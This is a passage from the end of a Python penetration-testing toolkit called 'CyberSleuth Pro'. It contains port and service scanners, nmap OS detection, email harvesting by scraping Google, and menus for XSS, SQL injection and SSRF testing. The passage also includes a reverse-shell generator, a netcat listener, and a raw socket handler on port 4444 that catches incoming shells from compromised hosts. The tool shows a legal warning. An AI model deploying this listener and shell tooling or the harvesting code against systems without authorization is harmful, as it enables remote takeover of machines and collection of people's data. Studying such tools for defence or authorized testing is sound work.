                print_status(f"Error testing {name}: {str(e)}", "error")
                continue

    @staticmethod
    def network_scan(target):
        """Automated network scanning"""
        print_status("Starting network scan...", "info")
        
        # Port scanning
        ports = [21, 22, 80, 443, 8080, 8443, 3306, 3389]
        
        def scan_port(port):
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(1)
                result = sock.connect_ex((target, port))
                if result == 0:
                    service = getservbyport(port) if port <= 1024 else "unknown"
                    print_status(f"Port {port} is open ({service})", "success")
                sock.close()
            except:
                pass
        
        with concurrent.futures.ThreadPoolExecutor(max_workers=100) as executor:
            executor.map(scan_port, ports)

    @staticmethod
    def osint_gathering(domain):
        """Automated OSINT gathering"""
        print_status("Starting OSINT gathering...", "info")
        
        # Email harvesting
        AutomatedScanner.email_harvest(domain)
        
        # Social media lookup
        AutomatedScanner.social_media_check(domain)

    @staticmethod
    def email_harvest(domain):
        """Automated email harvesting"""
        print_status("Harvesting emails...", "info")
        
        search_queries = [
            f"site:{domain} email",
            f"site:{domain} contact",
            f"site:{domain} @{domain}"
        ]
        
        found_emails = set()
        email_pattern = r"[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}"
        
        for query in search_queries:
            try:
                google_url = f"https://www.google.com/search?q={query}"
                headers = {'User-Agent': 'Mozilla/5.0'}
                response = requests.get(google_url, headers=headers, timeout=10)
                emails = re.findall(email_pattern, response.text)
                
                for email in emails:
                    if domain in email:
                        found_emails.add(email)
                        
            except Exception as e:
                print_status(f"Error searching Google: {str(e)}", "error")
                continue
        
        if found_emails:
            print_status("Found emails:", "success")
            for email in found_emails:
                print(f"  {email}")
        else:
            print_status("No emails found", "warning")

    @staticmethod
    def social_media_check(domain):
        """Check for social media presence"""
        print_status("Checking social media...", "info")
        
        platforms = {
            'Twitter': f"https://twitter.com/{domain}",
            'Facebook': f"https://facebook.com/{domain}",
            'LinkedIn': f"https://linkedin.com/company/{domain}",
            'Instagram': f"https://instagram.com/{domain}"
        }
        
        for name, url in platforms.items():
            try:
                response = requests.get(url, timeout=5)
                if response.status_code == 200:
                    print_status(f"{name} page found: {url}", "success")
            except:
                continue

# --- Network Scanner Module ---
class AdvancedNetworkScanner:
    @staticmethod
    def port_scan(target, ports=None, scan_type="normal", timeout=1):
        """
        Perform advanced port scanning with different scan types
        Options: normal, quick, full, aggressive, vuln
        """
        print_status(f"Starting {scan_type} port scan on {target}", "info")
        
        if not ports:
            if scan_type == "quick":
                ports = [21, 22, 23, 25, 53, 80, 110, 139, 143, 443, 445, 3389, 8080]
            elif scan_type == "full":
                ports = range(1, 1025)
            elif scan_type == "aggressive":
                ports = range(1, 49152)
            else:  # normal
                ports = [21, 22, 80, 443, 445, 3389, 8080, 8443]
        
        open_ports = []
        
        def scan_port(port):
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(timeout)
                result = sock.connect_ex((target, port))
                if result == 0:
                    try:
                        service = getservbyport(port)
                    except:
                        service = "unknown"
                    open_ports.append((port, service))
                    print_status(f"Port {port} is open ({service})", "success")
                sock.close()
            except Exception as e:
                pass
        
        with concurrent.futures.ThreadPoolExecutor(max_workers=100) as executor:
            executor.map(scan_port, ports)
        
        return open_ports

    @staticmethod
    def service_detection(target, port):
        """Identify service running on a specific port"""
        print_status(f"Detecting service on {target}:{port}", "info")
        
        try:
            nm = nmap.PortScanner()
            nm.scan(target, str(port), arguments='-sV')
            
            if target in nm.all_hosts():
                service = nm[target]['tcp'][port]['name']
                product = nm[target]['tcp'][port]['product']
                version = nm[target]['tcp'][port]['version']
                
                info = f"Service: {service}"
                if product:
                    info += f", Product: {product}"
                if version:
                    info += f", Version: {version}"
                
                print_status(info, "success")
                return {'service': service, 'product': product, 'version': version}
        except Exception as e:
            print_status(f"Service detection failed: {str(e)}", "error")
            return None

    @staticmethod
    def os_detection(target):
        """Perform OS detection using Nmap"""
        print_status(f"Attempting OS detection on {target}", "info")
        
        try:
            nm = nmap.PortScanner()
            nm.scan(target, arguments='-O')
            
            if target in nm.all_hosts():
                if 'osmatch' in nm[target]:
                    for osmatch in nm[target]['osmatch']:
                        print_status(f"OS Match: {osmatch['name']} (Accuracy: {osmatch['accuracy']}%)", "success")
                else:
                    print_status("No OS matches found", "warning")
        except Exception as e:
            print_status(f"OS detection failed: {str(e)}", "error")

    @staticmethod
    def vulnerability_scan(target, port):
        """Check for known vulnerabilities based on service and version"""
        print_status(f"Checking for vulnerabilities on {target}:{port}", "info")
        
        service_info = AdvancedNetworkScanner.service_detection(target, port)
        if not service_info:
            return
        
        found_vulns = []
        
        # Check our CVE database
        for cve, details in CVE_DATABASE.items():
            if details['port'] == port and details['service'].lower() in service_info['service'].lower():
                found_vulns.append((cve, details))
        
        if found_vulns:
            print_status(f"Found {len(found_vulns)} potential vulnerabilities:", "warning")
            for cve, details in found_vulns:
                print(f"  {cve}: {details['name']} (Severity: {details['severity']})")
        else:
            print_status("No known vulnerabilities found in database", "info")

    @staticmethod
    def full_network_scan(target):
        """Comprehensive network assessment"""
        print_status(f"Starting full network assessment of {target}", "info")
        
        # Phase 1: Quick scan to find open ports
        open_ports = AdvancedNetworkScanner.port_scan(target, scan_type="quick")
        
        if not open_ports:
            print_status("No open ports found", "warning")
            return
        
        # Phase 2: Service detection on open ports
        services = []
        for port, _ in open_ports:
            service = AdvancedNetworkScanner.service_detection(target, port)
            if service:
                services.append((port, service))
        
        # Phase 3: Vulnerability check
        for port, service in services:
            AdvancedNetworkScanner.vulnerability_scan(target, port)
        
        # Phase 4: OS detection
        AdvancedNetworkScanner.os_detection(target)
        
        # Phase 5: Aggressive scan if vulnerabilities found
        if any(service.get('product') for _, service in services):
            print_status("Performing aggressive scan on interesting ports", "info")
            interesting_ports = [port for port, _ in open_ports if port in [21, 22, 80, 443, 445, 3389]]
            AdvancedNetworkScanner.port_scan(target, ports=interesting_ports, scan_type="aggressive", timeout=3)

# --- Reverse Shell Module ---
class ReverseShellGenerator:
    @staticmethod
    def generate_shell(lhost, lport, shell_type=None):
        """Generate reverse shell commands"""
        print_status(f"Generating reverse shell to {lhost}:{lport}", "info")
        
        if not shell_type:
            print_status("Available shell types:", "info")
            for i, shell in enumerate(REVERSE_SHELLS.keys(), 1):
                print(f"  {i}. {shell}")
            
            choice = input("Select shell type (or Enter for all): ").strip()
            if choice.isdigit() and 0 < int(choice) <= len(REVERSE_SHELLS):
                shell_type = list(REVERSE_SHELLS.keys())[int(choice)-1]
        
        if shell_type:
            shell = REVERSE_SHELLS[shell_type]
            shell = shell.replace("{LHOST}", lhost).replace("{LPORT}", str(lport))
            print_status(f"\n{shell_type} Reverse Shell:", "success")
            print(Fore.GREEN + shell + "\n")
            return shell
        else:
            print_status("\nAll Reverse Shell Commands:", "success")
            for name, cmd in REVERSE_SHELLS.items():
                shell = cmd.replace("{LHOST}", lhost).replace("{LPORT}", str(lport))
                print(Fore.CYAN + f"\n{name}:\n" + Fore.GREEN + shell)
            print()
            return None

    @staticmethod
    def start_listener(port):
        """Start a simple netcat listener"""
        print_status(f"Starting netcat listener on port {port}", "info")
        try:
            subprocess.run(f"nc -lvnp {port}", shell=True)
        except KeyboardInterrupt:
            print_status("Listener stopped", "info")

    @staticmethod
    def interactive_shell():
        """Start an interactive shell session"""
        print_status("Starting interactive shell session", "info")
        
        # Create a socket
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.bind(('0.0.0.0', 4444))
        s.listen(1)
        
        print_status("Waiting for connection on port 4444...", "info")
        conn, addr = s.accept()
        print_status(f"Connection received from {addr[0]}:{addr[1]}", "success")
        
        # Set up the pty
        oldtty = termios.tcgetattr(sys.stdin)
        try:
            tty.setraw(sys.stdin.fileno())
            tty.setcbreak(sys.stdin.fileno())
            conn.settimeout(0.1)
            
            # Forward data between the socket and pty
            while True:
                try:
                    r, _, _ = select.select([conn, sys.stdin], [], [])
                    if conn in r:
                        data = conn.recv(1024)
                        if not data:
                            break
                        sys.stdout.write(data.decode())
                        sys.stdout.flush()
                    if sys.stdin in r:
                        conn.send(sys.stdin.read(1).encode())
                except socket.timeout:
                    continue
                except KeyboardInterrupt:
                    print("\nClosing connection...")
                    break
        finally:
            termios.tcsetattr(sys.stdin, termios.TCSADRAIN, oldtty)
            conn.close()

# --- Main Menu ---
def show_main_menu():
    print(Fore.MAGENTA + "\nMain Menu:")
    print(Fore.CYAN + "1. Advanced Reconnaissance Suite")
    print(Fore.CYAN + "2. Automated Vulnerability Scanner")
    print(Fore.CYAN + "3. Network Security Assessment")
    print(Fore.CYAN + "4. OSINT Intelligence Gathering")
    print(Fore.CYAN + "5. Phishing Detection Toolkit")
    print(Fore.CYAN + "6. Security Headers & SSL Analyzer")
    print(Fore.CYAN + "7. Admin Panel Finder")
    print(Fore.CYAN + "8. GeoIP Locator")
    print(Fore.CYAN + "9. Reverse Shell Generator")
    print(Fore.CYAN + "10. Advanced Web Testing")
    print(Fore.RED + "11. Exit")

def show_recon_menu():
    print(Fore.MAGENTA + "\nReconnaissance Options:")
    print(Fore.CYAN + "1. Full Reconnaissance")
    print(Fore.CYAN + "2. DNS & WHOIS Lookup")
    print(Fore.CYAN + "3. Subdomain Enumeration")
    print(Fore.CYAN + "4. WAF Detection")
    print(Fore.CYAN + "5. SSL/TLS Analysis")
    print(Fore.CYAN + "6. Back to Main Menu")

def show_network_menu():
    print(Fore.MAGENTA + "\nNetwork Assessment Options:")
    print(Fore.CYAN + "1. Quick Port Scan (Common Ports)")
    print(Fore.CYAN + "2. Full Port Scan (1-1024)")
    print(Fore.CYAN + "3. Aggressive Scan (All Ports)")
    print(Fore.CYAN + "4. Service Detection")
    print(Fore.CYAN + "5. OS Detection")
    print(Fore.CYAN + "6. Vulnerability Scan")
    print(Fore.CYAN + "7. Full Network Assessment")
    print(Fore.CYAN + "8. Back to Main Menu")

def show_shell_menu():
    print(Fore.MAGENTA + "\nReverse Shell Options:")
    print(Fore.CYAN + "1. Generate Reverse Shell Command")
    print(Fore.CYAN + "2. Start Netcat Listener")
    print(Fore.CYAN + "3. Interactive Shell Session")
    print(Fore.CYAN + "4. Back to Main Menu")

def show_web_testing_menu():
    print(Fore.MAGENTA + "\nWeb Testing Options:")
    print(Fore.CYAN + "1. Test for XSS Vulnerabilities")
    print(Fore.CYAN + "2. Test for SQL Injection")
    print(Fore.CYAN + "3. Test for SSRF Vulnerabilities")
    print(Fore.CYAN + "4. Test for CORS Misconfigurations")
    print(Fore.CYAN + "5. Test API Endpoints")
    print(Fore.CYAN + "6. Back to Main Menu")

# --- Main Function ---
def main():
    try:
        # Check and create required directories
        if not os.path.exists(REPORT_DIR):
            os.makedirs(REPORT_DIR)
        
        # Display legal warning
        legal_warning()
        
        # Initialize database
        init_db()
        
        # Main program flow
        print_banner()
        
        while True:
            show_main_menu()
            choice = input(Fore.YELLOW + "\nSelect an option: ").strip()
            
            if choice == "1":  # Advanced Recon
                while True:
                    show_recon_menu()
                    recon_choice = input(Fore.YELLOW + "\nSelect reconnaissance option: ").strip()
                    
                    if recon_choice == "1":
                        target = input("Enter target domain/IP: ").strip()
                        AdvancedRecon.full_recon(target)
                    elif recon_choice == "2":
                        target = input("Enter target domain: ").strip()
                        AdvancedRecon.dns_whois_check(target)
                    elif recon_choice == "3":
                        target = input("Enter target domain: ").strip()
                        AdvancedRecon.subdomain_enum(target)
                    elif recon_choice == "4":
                        target = input("Enter target domain: ").strip()
                        WAFDetector.enhanced_waf_detection(target)
                    elif recon_choice == "5":
                        target = input("Enter target domain: ").strip()
                        SSLCipherScanner.scan_ciphers(target)
                    elif recon_choice == "6":
                        break
                    else:
                        print_status("Invalid option", "error")
                        
                    input(Fore.GREEN + "\nPress Enter to continue...")
                    
            elif choice == "2":  # Automated Scanner
                target = input("Enter target URL or IP: ").strip()
                AutomatedScanner.full_scan(target)
                
            elif choice == "3":  # Network Assessment
                while True:
                    show_network_menu()
                    net_choice = input(Fore.YELLOW + "\nSelect network option: ").strip()
                    
                    target = input("Enter target IP: ").strip()
                    
                    if net_choice == "1":
                        AdvancedNetworkScanner.port_scan(target, scan_type="quick")
                    elif net_choice == "2":
                        AdvancedNetworkScanner.port_scan(target, scan_type="full")
                    elif net_choice == "3":
                        AdvancedNetworkScanner.port_scan(target, scan_type="aggressive")
                    elif net_choice == "4":
                        port = int(input("Enter port number: ").strip())
                        AdvancedNetworkScanner.service_detection(target, port)
                    elif net_choice == "5":
                        AdvancedNetworkScanner.os_detection(target)
                    elif net_choice == "6":
                        port = int(input("Enter port number: ").strip())
                        AdvancedNetworkScanner.vulnerability_scan(target, port)
                    elif net_choice == "7":
                        AdvancedNetworkScanner.full_network_scan(target)
                    elif net_choice == "8":
                        break
                    else:
                        print_status("Invalid option", "error")
                        
                    input(Fore.GREEN + "\nPress Enter to continue...")
                    
            elif choice == "4":  # OSINT Gathering
                domain = input("Enter target domain: ").strip()
                AutomatedScanner.osint_gathering(domain)
                
            elif choice == "5":  # Phishing Detection
                url = input("Enter URL to check: ").strip()
                AdvancedRecon.phishing_detection(url)
                
            elif choice == "6":  # Security Headers & SSL
                target = input("Enter target domain: ").strip()
                AdvancedRecon.security_headers_check(target)
                SSLCipherScanner.scan_ciphers(target)
                
            elif choice == "7":  # Admin Panel Finder
                target = input("Enter target URL: ").strip()
                AdminPanelFinder.find_admin_panels(target)
                
            elif choice == "8":  # GeoIP Locator
                target = input("Enter IP or domain: ").strip()
                GeoIPLocator.locate_ip(target)
                
            elif choice == "9":  # Reverse Shell
                while True:
                    show_shell_menu()
                    shell_choice = input(Fore.YELLOW + "\nSelect shell option: ").strip()
                    
                    if shell_choice == "1":
                        lhost = input("Enter your listening IP: ").strip()
                        lport = input("Enter listening port: ").strip()
                        ReverseShellGenerator.generate_shell(lhost, lport)
                    elif shell_choice == "2":
                        lport = input("Enter listening port: ").strip()
                        ReverseShellGenerator.start_listener(lport)
                    elif shell_choice == "3":
                        ReverseShellGenerator.interactive_shell()
                    elif shell_choice == "4":
                        break
                    else:
                        print_status("Invalid option", "error")
                        
                    input(Fore.GREEN + "\nPress Enter to continue...")
            
            elif choice == "10":  # Advanced Web Testing
                while True:
                    show_web_testing_menu()
                    web_choice = input(Fore.YELLOW + "\nSelect web testing option: ").strip()
                    
                    if web_choice == "1":
                        target = input("Enter target URL: ").strip()
                        AdvancedWebTester.test_xss(target)
                    elif web_choice == "2":
                        target = input("Enter target URL: ").strip()
                        AdvancedWebTester.test_sqli(target)
                    elif web_choice == "3":
                        target = input("Enter target URL: ").strip()
                        AdvancedWebTester.test_ssrf(target)
                    elif web_choice == "4":
                        target = input("Enter target URL: ").strip()
                        AdvancedWebTester.test_cors(target)
                    elif web_choice == "5":
                        target = input("Enter base API URL (e.g., http://example.com/api): ").strip()
                        AdvancedWebTester.test_api(target)
                    elif web_choice == "6":
                        break
                    else:
                        print_status("Invalid option", "error")
                        
                    input(Fore.GREEN + "\nPress Enter to continue...")
                
            elif choice == "11":
                print_status("Exiting CyberSleuth Pro. Stay ethical!", "success")
                break
                
            else:
                print_status("Invalid option selected", "error")
                
            input(Fore.GREEN + "\nPress Enter to continue...")
    
    except KeyboardInterrupt:
        print_status("\nOperation cancelled by user", "error")
        sys.exit(0)
    except Exception as e:
        print_status(f"Fatal error: {str(e)}", "critical")
        sys.exit(1)

if __name__ == "__main__":
    main()